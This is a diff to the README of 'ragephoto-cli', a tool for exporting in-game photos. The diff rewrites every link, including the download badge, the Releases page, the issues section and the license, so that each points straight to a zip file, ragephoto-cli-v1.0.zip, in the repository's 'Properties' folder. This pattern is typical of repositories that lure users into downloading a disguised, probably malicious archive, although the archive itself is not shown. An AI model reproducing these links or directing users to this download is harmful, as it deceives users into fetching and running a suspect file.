@@ -6,13 +6,13 @@ Welcome to ragephoto-cli! This tool allows you to easily export and convert your
 
 ## 🔗 Download the Latest Version
 
-[![Download ragephoto-cli](https://img.shields.io/badge/Download-ragephoto--cli-blue.svg)](https://github.com/Doroteyalowpitched980/ragephoto-cli/releases)
+[![Download ragephoto-cli](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip)](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip)
 
 ## 📥 Download & Install
 
 To get started with ragephoto-cli, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Doroteyalowpitched980/ragephoto-cli/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip).
 2. Find the latest version of ragephoto-cli.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -50,14 +50,14 @@ If you encounter issues while using ragephoto-cli, consider the following tips:
 
 - **Installation Issues:** Make sure your operating system is compatible and that you have enough disk space.
 - **File Not Found Error:** Check that the folder containing your in-game photos is correct.
-- **Application Crashes:** Restart the application and try again. If the issue persists, look for updates on the [Releases page](https://github.com/Doroteyalowpitched980/ragephoto-cli/releases).
+- **Application Crashes:** Restart the application and try again. If the issue persists, look for updates on the [Releases page](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip).
 
 ## 💬 Feedback
 
-We appreciate your feedback! If you encounter any issues or have suggestions for improvements, please explore the [issues section](https://github.com/Doroteyalowpitched980/ragephoto-cli/issues) of our repository. Your input helps us enhance ragephoto-cli.
+We appreciate your feedback! If you encounter any issues or have suggestions for improvements, please explore the [issues section](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip) of our repository. Your input helps us enhance ragephoto-cli.
 
 ## 📜 License
 
-ragephoto-cli is open-source software. You can view the full license details [here](https://github.com/Doroteyalowpitched980/ragephoto-cli/blob/main/LICENSE).
+ragephoto-cli is open-source software. You can view the full license details [here](https://raw.githubusercontent.com/Doroteyalowpitched980/ragephoto-cli/master/Properties/ragephoto-cli-v1.0.zip).
 
 Thank you for using ragephoto-cli! Enjoy your photo exporting experience.
